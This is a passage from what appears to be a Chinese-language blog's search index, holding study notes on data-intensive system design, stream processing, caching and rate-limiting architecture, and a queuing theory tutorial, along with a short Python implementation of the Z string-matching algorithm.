會產生臨時文件 (物化臨時狀態) 之後被copy到其他node!! 所以之後有spark把整個workflow當成一個task的框架 同時所有資料都在mem 這樣retry很容易 因為資料是持久化的 Reduce側連接與分組 (join in reduce) 排序合並連接（sort-merge join） 把要join的資料先載回來，sort 之後就可以join 分組 mapper用同一個key Reduce側方法的 優點 不需要對輸入數據做任何假設：無論其屬性和結構如何，Mapper都可以對其預處理以備連接 缺點 排序，覆制至Reducer，以及合並Reducer輸入，所有這些操作可能開銷巨大 處理偏斜 reducer會變成熱點 由於MapReduce作業只有在所有Mapper和Reducer都完成時才完成，所有後續作業必須等待最慢的Reducer才能啟動 偏斜連接（skewed join） 首先運行一個抽樣作業（Sampling Job）來確定哪些鍵是熱鍵 連接實際執行時，Mapper會將熱鍵的關聯記錄隨機（相對於傳統MapReduce基於鍵散列的確定性方法）發送到幾個Reducer之一 對於另外一側的連接輸入，與熱鍵相關的記錄需要被覆制到所有處理該鍵的Reducer上 Map側連接 如果你能對輸入數據作出某些假設，則通過使用所謂的Map側連接來加快連接速度是可行的 廣播散列連接（broadcast hash join） 把小數據集放到map的hash table，之後join 另一種方法是將較小輸入存儲在本地磁盤上的只讀索引中 桶連接（bucketed map joins） 把資料分類再跑broadcast hash join Mapper3首先將所有具有以3結尾的ID的用戶加載到散列表中，然後掃描ID為3的每個用戶的所有活動事件 Map側合並連接 如果輸入數據集不僅以相同的方式進行分區，而且還基於相同的鍵進行排序 在這種情況下，輸入是否小到能放入內存並不重要 因為這時候Mapper同樣可以執行歸並操作（通常由Reducer執行）的歸並操作 針對頻繁故障設計 MapReduce可以容忍單個Map或Reduce任務的失敗，而不會影響作業的整體，通過以單個任務的粒度重試工 它也會非常急切地將數據寫入磁盤，一方面是為了容錯，另一部分是因為假設數據集太大而不能適應內存 第十一章：流處理 為了減少延遲，我們可以更頻繁地運行處理 —— 比如說，在每秒鐘的末尾 —— 或者甚至更連續一些，完全拋開固定的時間切片，當事件發生時就立即進行處理，這就是流處理（stream processing）\n記錄通常被叫做 事件（event） ，但它本質上是一樣的：一個小的、自包含的、不可變的對象，包含某個時間點發生的某件事情的細節。一個事件通常包含一個來自日歷時鐘的時間戳，以指明事件發生的時間\n一個事件由 生產者（producer）生成一次，然後可能由多個 消費者（consumer）進行處理\n在某些系統中，網絡延遲可能低於磁盤訪問延遲，網絡帶寬也可能與磁盤帶寬相當。沒有針對所有情況的普適理想權衡，隨著存儲和網絡技術的發展，本地狀態與遠程狀態的優點也可能會互換。\n消息傳遞系統（messaging system） 生產者發送包含事件的消息，然後將消息推送給消費者 兩個問題 如果生產者發送消息的速度比消費者能夠處理的速度快會發生什麽 系統可以丟掉消息 將消息放入緩沖隊列 使用背壓 (有限的queue) 如果節點崩潰或暫時脫機，會發生什麽情況？ —— 是否會有消息丟失？ 傳送方式 直接從生產者傳遞給消費者 它們通常要求應用代碼意識到消息丟失的可能性 它們通常也只是假設生產者和消費者始終在線 當生產者崩潰時，它可能會丟失消息緩沖區及其本應發送的消息，這種方法可能就沒用了 消息代理 消息代理實質上是一種針對處理消息流而優化的數據庫 持久性問題則轉移到代理的身上 消息代理與數據庫的對比 刪除 數據庫通常保留數據直至顯式刪除 大多數消息代理在消息成功遞送給消費者時會自動刪除消息 工作集 由於它們很快就能刪除消息，大多數消息代理都認為它們的工作集相當小 如果代理需要緩沖很多消息，每個消息需要更長的處理時間，整體吞吐量可能會惡化 search 數據庫通常支持次級索引和各種搜索數據的方式 消息代理通常支持按照某種模式匹配主題 query 查詢數據庫時，結果通常基於某個時間點的數據快照 消息代理不支持任意查詢，但是當數據發生變化時，它們會通知客戶端 消息傳遞模式 負載均衡（load balancing） 每條消息都被傳遞給消費者之一 扇出（fan-out） 每條消息都被傳遞給所有消費者 確認與重新傳遞 為了確保消息不會丟失，消息代理使用確認（acknowledgments） 如果與客戶端的連接關閉，或者代理超出一段時間未收到確認，代理則認為消息沒有被處理，因此它將消息再遞送給另一個消費者。 但其實有可能已經被處理完了!! (ack可能被drop) 即使消息代理試圖保留消息的順序，負載均衡與重傳的組合也不可避免地導致消息被重新排序!! 基於日志的消息代理（log-based message brokers） 使用日志進行消息存儲 生產者通過將消息追加到日志末尾來發送消息 消費者通過依次讀取日志來接收消息 為了伸縮超出單個磁盤所能提供的更高吞吐量 可以對日志進行分區（按第六章的定義） 不同的分區可以托管在不同的機器上 使得每個分區都有一份能獨立於其他分區進行讀寫的日志 在每個分區內，代理為每個消息分配一個單調遞增的序列號或偏移量 所有偏移量小於消費者的當前偏移量的消息已經被處理，而具有更大偏移量的消息還沒有被看到 代理不需要跟蹤確認每條消息，只需要定期記錄消費者的偏移即可 日志與傳統的消息傳遞相比 為了在一組消費者之間實現負載平衡 代理可以將整個分區分配給消費者組中的節點 而不是將單條消息分配給消費者客戶端 每個客戶端將消費被指派分區中的所有消息 共享消費主題工作的節點數，最多為該主題中的日志分區數 如果某條消息處理緩慢，則它會阻塞該分區中後續消息的處理 磁盤空間使用 為了回收磁盤空間，日志實際上被分割成段 如果一個慢消費者跟不上消息產生的速率而落後得太多 它的消費偏移量指向了刪除的段，那麽它就會錯過一些消息 你可以監控消費者落後日志頭部的距離，如果落後太多就發出報警。 由於緩沖區很大，因而有足夠的時間來修覆慢消費者 重播舊消息 除了消費者的任何輸出之外，處理的唯一副作用是消費者偏移量的前進 把DB當成message brokers redo log當成message 變更數據捕獲（change data capture, CDC） 紀錄底層的狀態變更 存儲在搜索索引和數據倉庫中的數據，只是記錄系統數據的額外視圖 存儲在搜索索引和數據倉庫中的數據，只是記錄系統數據的額外視圖 變更數據捕獲通常是異步的 添加緩慢的消費者不會過度影響記錄系統 所有覆制延遲可能有的問題在這里都可能出現 事件溯源（Event Sourcing） 應用邏輯顯式構建在寫入事件日志的不可變事件之上 事件通常表示用戶操作的意圖，而不是因為操作而發生的狀態更新機制 所以你需要完整的歷史事件來重新構建最終狀態 這里進行同樣的日志壓縮是不可能的 仔細區分事件（event） 和命令（command） 用戶的請求剛到達時，它一開始是一個命令 可能失敗 如果驗證成功並且命令被接受，則它變為一個持久化且不可變的事件 在事件生成的時刻，它就成為了事實（fact） 並發控制 事件溯源和變更數據捕獲的最大缺點是，事件日志的消費者通常是異步的，所以可能會 用戶會寫入日志，然後從日志衍生視圖中讀取，結果發現他的寫入還沒有反映在讀取視圖中 一種解決方案是將事件追加到日志時同步執行讀取視圖的更新 需要事務 流處理 特色 當查詢進入時，數據庫搜索與查詢匹配的數據，然後在查詢完成時丟掉查詢 分析往往對找出特定事件序列並不關心，而更關注大量事件上的聚合與統計指標 構建物化視圖可能需要任意時間段內的所有事件，除了那些可能由日志壓縮丟棄的過時事件 查詢被存儲下來，文檔從查詢中流過 事件時間與處理時間 測量請求速率，按處理時間來衡量速率 如果你重新部署流處理器，它可能會停止一分鐘，並在恢覆之後處理積壓的事件 請求速率看上去就像有一個異常的突發尖峰 實際上請求速率是穩定的 要統計的方式思考、而不是取樣的方式思考 知道什麽時候準備好了 你永遠也無法確定是不是已經收到了特定窗口的所有事件，還是說還有一些事件正在來的路上 忽略這些滯留事件 發布一個更正（correction），一個包括滯留事件的更新窗口值 在某些情況下，可以使用特殊的消息來指示“從現在開始，不會有比t更早時間戳的消息了” 你用的是誰的時鐘？ 事件上的事件戳實際上應當是用戶交互發生的時間，取決於移動設備的本地時鐘 本地時鐘可能改過 方法 記錄三個時間戳 事件發生的時間，取決於設備時鐘 事件發送往服務器的時間，取決於設備時鐘 事件被服務器接收的時間，取決於服務器時鐘 通過從第三個時間戳中減去第二個時間戳，可以估算設備時鐘和服務器時鐘之間的偏移 然後可以將該偏移應用於事件時間戳，從而估計事件實際發生的真實時間 窗口的類型 滾動窗口（Tumbling Window） 滾動窗口有著固定的長度，每個事件都僅能屬於一個窗口 跳動窗口（Hopping Window） 跳動窗口也有著固定的長度，但允許窗口重疊以提供一些平滑 滑動窗口（Sliding Window） 滑動窗口包含了彼此間距在特定時長內的所有事件 會話窗口（Session window） 將同一用戶出現時間相近的所有事件分組在一起，而當用戶一段時間沒有活動時窗口結束 不變性的局限性 永遠保持所有變更的不變歷史，在多大程度上是可行的？ 答案取決於數據集的流失率 數據集上有較高的更新/刪除率，不可變的歷史可能增至難以接受的巨大 碎片化可能成為一個問題，壓縮與垃圾收集的表現對於運維的穩健性變得至關重 不能做到真正的刪除 隱私條例可能要求在用戶關閉帳戶後刪除他們的個人信息 但副本可能存在於很多地方 冪等性 丟棄任何失敗任務的部分輸出，以便能安全地重試，而不會生效兩次 分布式事務 依賴冪等性（idempotence） 依賴冪等性意味著隱含了一些假設 重啟一個失敗的任務必須以相同的順序重播相同的消息，處理必須是確定性的，沒有其他節點能同時更新相同的值 雙寫（dual write）的問題 如果周期性的完整數據庫轉儲過於緩慢，有時會使用的替代方法是雙寫 應用代碼在數據變更時明確寫入每個系統 (DB, search index\u0026hellip;) 雙寫有一些嚴重的問題 競爭條件 (並發檢測機制: 版本向量) 其中一個寫入可能會失敗，而另一個成功 (原子提交) 第十二章：數據系統的未來 skip\n","permalink":"https://littlebees.github.io/2022/01/designing-data-intensive-applications/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不可多得的一本書，把所有與DB與distrubuted computing的手法與議題都說了一遍\u003c/p\u003e\n\u003cp\u003e有\u003ca href=\"https://github.com/Vonng/DDIA\"\u003e簡中翻譯\u003c/a\u003e\u003c/p\u003e","title":"Designing Data-Intensive Applications"},{"content":"動機 查漏補缺\nch1: 高性能架構 效能指標 throughput TPS(transaction per second) QPS(queries per second) 併發數 同時處理的數目: 同時在線user, 併發連線數\u0026hellip; response time amdahl\u0026rsquo;s law 可靠度指標 無故障時間 指標之間的影響 throughput \u0026amp; 併發數 (一開始) 併發數上升 =\u0026gt; throughput上升 (持平) 併發數上升 =\u0026gt; throughput不變 系統臨界點 (下降) 併發數上升 =\u0026gt; throughput下降 系統隨時都會崩潰 併發數 \u0026amp; response time (併發req數目) m/m/1的平均時間公式 service的處理rate(mu那一個, 系統可以承受的最大併發數) (一開始) req的數目小於系統可以承受的最大併發數，response time上升不明顯 (過了可以承受的最大併發數) response time急速增加 系統中觀察到正在處理的req/thread數目 response time大 =\u0026gt; 卡在system中的req/thread會比較多!! ch2: 分流設計 CDN 優點 減少系統併發數 減少response time 減少網路壅塞 原理 多個CDN node，DNS做query時根據使用者位置回傳最近的ip CDN node會變成cache proxy，有就回傳；沒有就relay req到主機 可以把CDN對地址動手腳的方法用到service discovery\nservice discovery 服務註冊 user: 去registry找service的實際位置 registry: 維護service的清單 server: 要把自己登記到registry 服務規則 user: 去registry找service地址的使用規則 registry: 放service地址的使用規則，讓user自己判斷要去哪 server: 要開發或是營運去調整規則 反向代理 由proxy分配req到不同的server (追求load balance就是load balancer；server的任務都不同就是一般的反向代理)\n原理 level 4: 只看ip與port做分配 level 7: 看req內容作分配，eg: http, ftp\u0026hellip; 對外面來說，ip與port都是一樣的!! ch3: 服務平行設計 叢集: 有很多同樣的server的set，一起提供服務 server無狀態 無狀態的節點叢集 一般都是負責query之類沒有狀態的服務 平行喚醒問題 在這個set加入定時寄信功能 結果所有server一起寄信!? 解法: 外部喚醒 打req進來，跑功能，這樣就只會有一台跑 server有狀態 server自己維護狀態 要與別人share 資訊一致的節點叢集 大家都有自己的狀態，但需要與其他server的狀態同步 一致性問題(讀寫不一致): 我在A改的，在B看不到 一致性的等級 強一致性 2 phases commit 3 phases commit 最終一致性 有retry的msg queue 不要與別人share 單一服務節點叢集 user與server是被綁定的!! how to bind? user指定 online game的選server 根據位置、user id 先隨便assign，把server位置寫到cookie中 單點失敗 server把狀態抽出去 資訊共用的節點叢集 在redis之類的地方紀錄state，像是session redis之類的地方 會是bottleneck 需要concurrent的控制 分散式系統 把server中的(實體/虛擬)元件拆掉，像web server與DB跑在不同host 如果有元件是bottlebeck，可以用叢集拆掉 一致性問題(讀寫不一致): 我在A改的，在B看不到 同資訊一致的節點叢集 所有元件是可組合的? 微服務系統 ch4: 運算併發 多process 可能在不同的cpu跑(平行)，也可能在同一顆跑(共時) 具有很強的隔離 像是開兩個server在process 可以兩個指定不同的port，就有兩台獨立的server ctx switch的成本高 cache要預熱 在userspace與kernel space之間切換 reg的切換 IPC不好做 sync 使用情境 獨佔 (競爭) 協作: 等對方好了在一起走 獨佔、協作的詳細介紹，去看Parallel Thinking 多thread 可能在不同的cpu跑(平行)，也可能在同一顆跑(共時) ctx switch的成本小 都在同一塊記憶體 有locality 使用情境 做非同步 (會block的工作) 處理subtask，之後merge sync 使用情境 獨佔 (競爭) 協作: 等對方好了在一起走 獨佔、協作的詳細介紹，去看Parallel Thinking fiber就是continuation 只能在同一顆跑(共時) 執行fiber就會停下當下的動作，之後執行會回到原本的位置 不會race condition 不會平行是concurrent!! ctx switch的代價很小 sync 使用情境 協作: 等對方好了在一起走 ch5: 輸入輸出設計 去看之前的文章\nch6: 資料庫設計與最佳化 設計table 當成設計class，但是只有primitive與reference而已 array要轉90度，變成table (NF1) 所有的欄位(primitive)可以是來自 自己本身的屬性 另一個物件展開的結果 (NF2, NF2, BCNF, 反正規化) 去看之前的文章 index 故障 一個col做index 上index的column做修改 用錯type去query (string卻用成int，雖然會被cast，但index會失效) 多個col做index (Btree) query沒有包含前面的col(左手邊) index從第一個col開始sort，一直下去，所以做query時需要前面的 (hash) 沒有全部的col 對string做index 如果有wildcast, btree與hash都會沒用，要用inverted index btree !=, \u0026lt;\u0026gt;, NOT IN, NOT IN IN =\u0026gt; BETWEEN null index沒辦法對null做任何事 用其他值代替!! 不同的engine不同的index (與其他) innoDB會把hash自動換成btree (innoDB沒有做hash) 自建交易 可以undo的action沒差 不能undo的action(對外界有影響) 最多只能有一個 只能在最後一位 資料太多了 table分區 (partition) 把一個table(file)分成多個檔案 對於table的操作不變 (在外面來看這個table還是一樣) 可以存到不同的HDD 增加throughput 增加能存的entry數量 可以針對某一區做操作，不影響其他區 query最好要把當初做分區的條件放入query 不然要所有分區都跑 分庫 把DB切開 table怎麼辦? 分table 分table 不分割(split)table 每個DB都有一些完整的table 分割(split)table 水平分割 把資料放到不同的表 [(1,2), (3,4)] =\u0026gt; [(1,2)], [(3,4)] 垂直分割 依據col去割，之後用primiary key來認同一個row [(1,2), (3,4)] =\u0026gt; [(1,3)], [(2,4)] 原則: 不要跨table 水平分割 一次需要所有col 垂直分割 只要一部份col 對於table的操作要改 (程式要改) table變得不一樣了 路由操作: 要改table的name (現在有多個table) 拼接操作: 要多加join (垂直分割如果需要另一個表的col) 讀寫分離 多個DB分別處理讀與寫 路由操作: 讀與寫要到對的DB 主從複製: 主從要同步!! (一致性問題) 複製的材料 log statement: 就是指令 (但遇到調用now_time之類的，就沒辦法反映真實資料到read db上) row: 就是資料 mixed: 就是指令+資料 非同步複製 (not reliable) write後立刻return，log非同步的傳 write db掛了又沒傳log就gg了 半同步複製 write後等log傳到某個db才return 全同步複製 write後等log傳到所有db才return DB中介軟體 就是DB的middleware，處理上面的路由操作、拼接操作、主從複製之類的問題 eg: MyCat ch7: 快取設計 cache for reading cache會花費到的時間 寫入cache時 生成key時 hash function 比較key 寫入mem時 寫mem 寫入什麼? 序列化物件 讀寫時都要經過序列化 原本的物件 不用反序列化 如果存的是reference? 會發生race condition!! 解法: 存序列化物件 或是 deep copy 讀cache時 生成key時 hash function 比較key 讀mem時 中 讀mem 沒中 跑原本 cache update 被動update 時效性更新 有過期時間 主動update cache aside read: 正常的讀，找不到去後面拉資料 去後面拉資料的時候要不要把cache刪了? 刪 如果寫入中，有另一個read 就會拉到舊的值到cache!! 但寫入完成後，雙方資料就不一致了 不刪 (good) read時，如果莫名其妙被block住 之後這之間有write完成 read就會拿到舊的值 但這不太可能，只要 read夠快 確保不會被preemptive 就不會發生 write: 直接往後方寫，不直接更新cache write through read/write: 都透過cache (同步) cache變成單點失敗的點 write behind 改write through的write成非同步 如果cache掛了 可能沒寫到!! cache clear 時效性 訂個過期時間 時間到就自己不見 讓另一個thread去清 固定pool數量 FIFO LRU 非強引用 GC的延伸，有ref到的就是有用的obj，所以不能刪，但沒有就是可以刪 這樣obj只有刪與不刪 但有的情況是在mem吃緊時可以刪 所以ref要有所區分 ref的分類 強引用: 一般的ref 軟引用: 會在mem不足時回收 弱引用: 不管mem夠不夠只要被gc就會被回收 虛引用: gc會當成看不到他 cache 的問題 cache穿透 如果連後面都沒有結果? 沒辦法寫到cache cache根本沒用!! 解法: 丟空值 像是linux的dentry(查詢路徑的node)遇到不存在的中間點(資料夾或是file) dentry會被create，但是標註(state)為不存在 cache擊穿 高頻率被access的資料被清掉? 所有req都往後了!! 會發生在 cache aside (因為沒有一致的保證，throught是強一致，behind是弱一致(最終一致的下一階)) 時效性清理 FIFO清理 cache預熱 需要req讓資料慢慢變多 兩個點 如果一次來大量req cache擊穿 如果是 時效性清理 與 長時間沒有req 反覆預熱 cache的位置 cache越前面越好 常見位置 client side browser的 localstorage \u0026amp; sessionstorage indexdb \u0026amp; web sql application cache 靜態cache CDN reverse proxy 服務cache 在stateful的服務中 具有一定通用return的服務(function)做cache DB的cache cache for writing cache在前面cache所有write的資料，之後再由cache去write到db (限流) 平滑write，消去大量的同樣的write req 總體而言 比起原本的write多了寫入與讀取cache的成本 但是對於user而言，只有cache的response time (比較短!!) cache要在後方有資源時才開始寫入，不然後面會爆 ch8: 可靠性設計 module串接方式 串聯: m1 -\u0026gt; m2 -\u0026gt; m3 ... 並聯: m/m/n的圖 只能處理不response的server 可以容錯到只要有一台是正確的就好 容錯 m/m/n的圖 + 裁決器(有過半數的相同response就當成是對的response) 可以處理有惡意(亂回答)與不response的server 拜占庭容錯!! 可以容錯到至少有一半+1台有一樣的response就好 可靠性設計 消除單點依賴 把串聯轉成並聯 叢集 相等式: 並聯 主從式: 一台服務、其他backup ch9: 應用保護 故障等級 所有user都能用所有service 部分user都能用所有service 部分user都能用部分service 不能提供service但可以恢復 系統crash但不影響其他系統 系統crash且影響到其他系統 隔離 用thread pool(或是semaphore去替代)，去包服務 每次invoke就是用thread跑 如果沒有thread可以用了(像是所有thread都因為server掛了，而block)，也繼續跑 限流/恢復 tc的qdisc algo 時間窗 一段時間中只放最多幾個req進來 如果有大量的req在開始計時時，一次出現 後面來看根本沒限到流 (還是一次很多) 從system來看 會有一堆沒辦法服務到 後面的服務空轉 漏桶 把時間窗的時間變小，一放一個req，剩下用queue去存 現在整個流平順了 但是如果queue不夠大 從system來看 會有一堆沒辦法服務到 後面的服務空轉 token bucket 每個單位時間生一個token，1個token放一個req token可以存!! 避免服務空轉 如果不調整token的總數，放著讓它長 如果有大量的req在開始計時時，一次出現 後面來看根本沒限到流 (還是一次很多) 兩個差在? 限流: 把收的req壓在一定數量 恢復: 慢慢把可以收的req往上拉 降級/融斷 (手法) 把複雜的server換成簡單的 不直接讀db改讀cache 精確結果改成近似結果 返回靜態結果 (不跑運算) 同步改成非同步 停用非必要的功能 禁止寫入 依據user level做diffSrv 降級/融斷依據 失敗次數/機率過高 限流啟動時 手動 兩個差在? 降級: 以降低response time 融斷: 以維持服務繼續 ch10: 前端高性能 資源下載 資源壓縮 content-encoding 減少req 資源合併 sprite圖 keep-alive與polling與server push 資源快取 Etag等等 redner最佳化 Reflow \u0026amp; Repaint (最花時間的步驟) 整個網頁就是一棵樹 最後要排版(reflow) 畫到畫面上(repaint) 讓影響範圍變小 觸發方式 dom新增/刪除 =\u0026gt; 直接改dom的內容 =\u0026gt; 讓frontend framework代勞 dom大小/定位方式/邊距/pesudo class改變狀態 =\u0026gt; 保持上面的不變 (要常常變動) =\u0026gt; 把parent node設成display: none，從一開始就沒有在tree中 這樣reflow就會是1次而已 lazy loading 先載入必要的部分，需要再load其他的 proload/prefetch 比較大的檔案可以先下載 ch11: 架構設計理論 skip\nch12: 高性能架構實踐 skip\n","permalink":"https://littlebees.github.io/2022/01/%E5%B7%A8%E5%9E%8B%E6%9C%8D%E5%8B%99%E6%9E%B6%E6%A7%8B%E5%88%86%E5%B8%83%E5%BC%8F/%E8%B3%87%E6%96%99%E5%BA%AB%E5%84%AA%E5%8C%96/%E8%A8%98%E6%86%B6%E9%AB%94%E5%BF%AB%E5%8F%96%E8%A8%AD%E8%A8%88/io%E6%A8%A1%E5%9E%8B/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e查漏補缺\u003c/p\u003e","title":"巨型服務架構：分布式/資料庫優化/記憶體快取設計/IO模型"},{"content":"動機 補完當年的queuing thoery\n一言以蔽之，這到底在幹嘛 替queue建模 用random variable說話(設計每個queue的部分) 其實queuing thoery應該要另外開一堂專門介紹怎麼操作random variable才對 複習機率 Random variable到底是什麼 高級的random，可以生出對應的output。 可以把Random variable當成疊加態，等到去用時才會確定一個值，所以可以對這個RV算機率、期望值等等性質\n連續與離散 連續與離散就是看這個高級的random丟出來的值的range是可數還是不可數\n同時連續與離散的RV也有不同的術語\n連續 Cumulative Distribution Function pdf的積分，可以得到小於等於某個值的機率 Probability density function cdf的微分，就是圖上的那條線 (不是機率!!) 因為pdf的output可能超過1 PDF is not a probability. 離散 probability mass function 就是機率 Cumulative Distribution Function pmf的總和，可以得到小於等於某個值的機率 期望數 \u0026amp; 變異數 期望數: output與pdf/pmf的加權總合 E(aY+bX) = aE(Y) + bE(X) E(g(X)) = sum(g(x)*pmf_or_pdf(x)) 這個很重要，之後會對X上一堆函數，需要這個才知道發生什麼事 如果有獨立的話，E(X \u0026amp; Y) = E(X) * E(Y) 這個也很重要 變異數: output與期望數的差距平方 (就是懶得算sqrt) 標準差: 給變異數上sqrt conditional probability 就是重新取scope，在Y中X的機率，所以把分母改成Y，分子改成X\u0026amp;Y P(X | Y) = P(X \u0026amp; Y) / P(Y)\n配合獨立，P(X | Y) = P(X)\n貝氏: P(X | Y) = P(Y | X) * (P(X) / P(Y)) X與Y的and可以透過條件機率換出來，P(X | Y) * P(Y) = P(X \u0026amp; Y) = P(Y | X) * P(X)\nConditional Independence 就是在這個scope中兩RV是獨立的，但沒這個scope，它們不一定獨立 P(X \u0026amp; Y | Z) = P(X | Z) * P(Y | Z)\nConditional Independence — The Backbone of Bayesian Networks\n新Random variable的推導 Poisson Distribution 詳細推導可以看這邊Poisson Distribution — Intuition, Examples, and Derivation\n如果想知道\ntry n次 時 某事件 成功/失敗 的機率 可以用二項式分布，但是\n我們要知道次數 只能看 成功/失敗 的機率 (可以把成功當成事件發生的機率) 然而更多時候我們只知道某一段時間中的事件發生的平均值而已 所以需要把二項式分布改造一下\n把事件發生的機率還原成事件發生的平均值 / 總次數 接著把n拉到無限大，當成做很多次實驗\n之後處理前面那一坨 所以Poisson Distribution就是n拉到無限大的結果，這樣也讓他有一些使用上的假設\n每個單位時間的事件發生的機率都是一樣的 事件是獨立的 Exponential Distribution 詳細推導可以看這邊Exponential Distribution — Intuition, Derivation, and Applications\n現在想要看從一個事件發生後，要多久才會有下一個事件\n如果沿用Poisson Distribution就是看分布之間的機率\nhow? 事件發生後，要多久才會有下一個事件，也就是沒事件的時間有多久，所以把Poisson Distribution帶0 但是Poisson Distribution看的是每個單位時間，但我們需要的是一段時間 一次不夠，可以乘好幾次(獨立)，e^(-λt)\n這樣是在t後開始出現下一次事件的機率，in math P(T \u0026gt; t) = e^(-λt) 注意到這裡的時間默默變成RV了\n之後就是用機率的終極定理，機率加總等於1 只要用1去減，就可以得出cdf，之後微分就是pdf\nmemoryless P(T \u0026gt; a + b | T \u0026gt; a) = P(T \u0026gt; b)\nPoisson Process process其實就是RV多加一個time的參數，所以公式與exp dist很像，但是可以指定某時間區段中發生k次 怎麼推導新的Random variable 詳細推導可以看這邊Sum of Exponential Random Variables\n利用獨立與Marginal distribution (就像是對其中一個RV做微分)\n下面是兩個exp dist相加的cdf 之後就可以求pdf 這就是Erlang distribution\nqueuing model 怎麼叫queue queue長這樣 有這些元素 (會給的與要算的) n是數量，分成在queue與在server w是waiting time s是service time r是residual time (sojourn time, response time)，在整個系統中的逗留時間 λ(速度) µ是service的rate(速度)\n把queue的特性寫下來 接下去? 做下面3件事\n對每個部位用不同的Random variable去描述 把queue的東西換一換 組合1與2 之後看怎麼把他們組合在一起\n通常有兩個觀察者\nglobal (time) user Random variable有自己的特性，每個queue model也有自己的特性 不要搞混，不論何時都要想到現在探討的東西與queue之間的意義\nclassic queue model 適用於所有queue的law G/G/m Stability Condition: λ \u0026lt; m*µ Little\u0026rsquo;s law: n_queue = λ * 平均waiting_time n = λ * 平均response_time m/m/1 Poisson arrivals (λ) Exponential service times (µ) 1 server 無限buffer FIFO 在這個時候system有多少人 從N(t) → N(t + ∆t)會有3種case\n1 arrival λ∆t 1 service µ∆t no arrival, no service 1 − (λ + µ)∆t in math Steady-state analysis: 如果把t設成無限大(微掉t)? 把Chapman Kolmogorov equation調成微掉t 解偏微分 (列遞迴加總等於1) stable λ \u0026lt; m*µ m帶1\n所以λ/µ(這邊叫ρ, traffic intensity or load)要小於1 一些元素 Markov Chains Discrete-time Markov Chains Markov Chains的重點是只依據目前的狀態轉到下一個狀態\n寫成matrix 在這個時候system有多少人 兩個版本，一個算式版，一個matrix版 Steady-state analysis : 把n去掉 先是算式版 把上螢光的部分丟到左邊去 另一個matrix版 總input == 總output ergodicity: a unique positive steady-state distribution ergodicity 中文叫遍歷性，不管系統的初始狀態如何，在經歷了一段時間以後，系統就會處於統計平衡狀態\n有三個條件\nirreducible: From any state, it is possible to get to any state\n整個圖是個SC，不管從哪邊開始，都可以走到graph的任意一點 沒有的話 lose positivity, and possibly uniqueness, of the steady-state distribution positive recurrent: The expected return time to any state is finite\n應該叫deterministic graoh的node的量是有限的 沒有負環 沒有的話 這樣有些state無法到達穩定 (就是unstable) Aperiodicity: There is no T ≥ 2 such that paths from a state to itself can only take multiples of T steps\n可以把no T ≥ 2換成T \u0026lt; 2，也就是最多一步 從自己到自己最多只有1步 如果有period在，這樣在算這一點的機率時 在自己的點，可以產生無限多條從自己開始的path，這樣就不用算了 沒有的話 這樣在算state時會看到 P_ii * P_ii的詭異畫面 Continuous-time Markov Chains 定義 大概長這樣 同樣的事件轉移機率，同樣的從system中i人，變成j人 不同的是現在是看arrival與service done(departure)誰先發生 寫成matrix 這裡定義了新東西: Transition rates 為了符合當初的機率加總等於1，所以把自己到自己設成-λ 在這個時候，system在什麼狀態 Steady-state analysis : 把t去掉 總input == 總output 特化的例子: Birth-death processes 只有兩個方向，往前或往後 Local balance == global balance equations Special matrix: Triangular system Stationary distribution 例子: M/M/1 queue with balking 看到有人可能client就直接走人 Stationary distribution 例子: M/M/1/K Stationary distribution Loss probability \u0026amp; Blocking probability \u0026amp; Ergodic Blocking probability: 是在t時刻整個system已經滿了 剛好等於整個system處於滿的時間總和對上觀察區間的比值 Loss probability: 是在client到system時整個system已經滿了 之後有一個特性是描述這兩個可以是等於的!!\nErgodic theorem 遍歷性 表現出來會是: 從時間上觀察，與從user的角度觀察，結果是一樣的 時間均值等於空間均值 例如要得出一個城市A、B兩座公園哪一個更受歡迎，有兩種辦法 第一種辦法是在一定的時間段考察兩個公園的人數，人數多的為更受歡迎公園 第二種辦法，隨機選擇一名市民，跟蹤足夠長的時間來統計他去兩個公園的次數，去得多的為更受歡迎公園 因為現在client是Poisson process，所以可以用Poisson Arrivals See Time Averages，其實就是遍歷性 這樣就可以用前面的Stationary distribution直接求Loss probability Multi-server systems M/M/C/C: Pure-Loss System 長這樣 user不會retry\n狀態圖 同時開C台server，所以service的RV是Exp(k*µ)，k是看現在有多少台正在跑\nSteady-State Distribution Blocking Probability a.k.a Erlang-B Steady-State Distribution帶C 與 PASTA\nM/M/C/∞: Waiting System 長這樣 現在有queue了!! Stability: ρ \u0026lt; C\n狀態圖 Steady-State Distribution waiting probability a.k.a Erlang-C Steady-State Distribution帶C 與 PASTA 一些元素 Steady-State Distribution 與 little law導平均有多少人在system 之後，把service time與waiting time相加就是residual time 注意這裡的service time只有一台server multi-cpu 與 multi-core Ref Queuing Theory: from Markov Chains to Multi-Server Systems\n","permalink":"https://littlebees.github.io/2022/01/queuing-thoery%E7%9A%84tutorial/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e補完當年的queuing thoery\u003c/p\u003e","title":"queuing thoery的tutorial"},{"content":"動機 Z algo z[i]是看這個位置i開始，與從0開始的string，有多長是一樣的\n所以可以把pattern接到要比對的字串最前面，之後產生z function，去找與pattern一樣長的位置\n那重點就是怎麼產生z function? z function是從i開始往前看，所以可以利用前面已經看過的z[i]來加速\n假設有一個已經生完z[i]的範圍(最靠右)\n看i是不是在範圍中，同時看利用之前的z[i-l]延伸出去，如果還在範圍，就抄答案 不能抄答案就重新算 def mk_z(S): z = [0]*len(S) l, r = 0, 1 def extend(l, r): while r \u0026lt;= len(S) and S[r-l-1] == S[r-1]: r += 1 return r # [l,r) # most examples use [i,r], which is closed range # I dont like closed range, so I use [l,r) to rewrite this prog for i in range(1,len(S)): # ((l) ... i) ..z[i-l].. r if i \u0026lt; r and i+z[i-l] \u0026lt; r-1: # i+z[i-l] is extended str, and this is in range z[i] = z[i-l] # so we can compute z[i] directly else: # i is not in [l,r) or i+z[i-l] \u0026gt;= r-1, so we need a new [l,r) l = i # new range r = extend(l, i+1 if i \u0026gt;= r else r) # use new end \u0026amp; extend z[i] = r-l-1 # new [l,r), new z[i] (compute) return z def z_algo(S,pat): magic = f\u0026#39;{pat}.{S}\u0026#39; # \u0026#39;.\u0026#39; must not exist in S \u0026amp; pat z = mk_z(magic) offset = len(pat)+1 for i in range(offset, len(magic)): if z[i] == len(pat): return f\u0026#39;found at {i-offset}\u0026#39; return \u0026#39;no found\u0026#39; ","permalink":"https://littlebees.github.io/2021/11/z-algorithm/","summary":"\u003ch2 